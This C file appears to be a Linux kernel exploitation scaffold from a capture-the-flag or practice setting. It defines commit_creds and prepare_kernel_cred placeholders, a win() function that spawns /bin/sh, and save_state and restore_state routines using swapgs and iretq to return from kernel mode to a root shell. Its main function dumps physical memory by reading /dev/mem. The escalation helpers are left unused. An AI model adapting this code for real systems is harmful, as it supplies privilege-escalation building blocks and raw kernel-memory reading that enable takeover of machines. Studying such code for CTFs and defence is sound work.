#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#define BUF_SIZE 	64

void* commit_creds = 		0x0;
void* prepare_kernel_cred = 0x0;

static void win() {
	puts("[+] Call win()");
	system("/bin/sh");
}

unsigned long user_rsp, user_cs, user_ss, user_flags;
unsigned long addr_win = win;

static void save_state() {
	__asm__("mov %0, cs": "=r"(user_cs) : "r"(user_cs));
	__asm__("mov %0, ss": "=r"(user_ss) : "r"(user_ss));
	__asm__("mov %0, rsp": "=r"(user_rsp) : "r"(user_rsp));
	__asm__("pushfq");
	__asm__("popq %0": "=r"(user_flags) : "r"(user_flags));
}

// gadget for return to user
static void restore_state() {
	__asm__("swapgs");
	__asm__("mov [rsp+0x20], %0": "=r"(user_ss): "r"(user_ss));
	__asm__("mov [rsp+0x18], %0": "=r"(user_rsp): "r"(user_rsp));
	__asm__("mov [rsp+0x10], %0": "=r"(user_flags): "r"(user_flags));
	__asm__("mov [rsp+0x8], %0": "=r"(user_cs): "r"(user_cs));
	__asm__("mov [rsp], %0": "=r"(addr_win): "r"(addr_win));
	__asm__("iretq");
}

int main(int argc, char** argv){
	puts("hello km2");
	
  	if (argc < 3) {
		puts("ERROR");
		return;
	}
	size_t size = strtoll(argv[1], NULL, 16);
	off_t offset = strtoll(argv[2], NULL, 16);
	
	char buf[0x1000];
	int fd = open("/dev/mem", O_RDWR|O_SYNC);
	if (fd == -1) {
	  perror("/dev/mem");
	  return -1;
	}
	
	lseek(fd, offset, SEEK_SET);
	read(fd, buf, size);
	
	off_t i;
	for(i = 0; i < size; i+= 8) {
		//printf("0x%016lu: 0x%016lu\n", offset+i, *(unsigned long*)(&buf[i]));
		printf("0x%016lx: 0x%016lx\n", offset+i, *(unsigned long*)(&buf[i]));
	}

  	close(fd);

	return 0;
}
